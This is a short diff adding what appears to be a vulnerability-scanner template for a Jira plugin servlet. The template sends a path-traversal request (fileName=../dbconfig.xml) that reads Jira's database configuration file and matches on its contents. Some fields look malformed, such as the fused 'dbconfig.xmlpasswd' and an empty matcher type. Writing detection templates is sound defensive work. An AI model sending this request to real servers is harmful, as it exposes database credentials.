@@ -1,0 +1,10 @@
+name: admin
+request:
+    path: '{{BaseURL}}/plugins/servlet/snjCustomDesignConfig?fileName=../dbconfig.xmlpasswd&fileMime=$textMime'
+    method: GET
+    matcherscondition: and
+    matchers:
+        - type: ""
+          part: part
+          words:
+            - <jira-database-config>
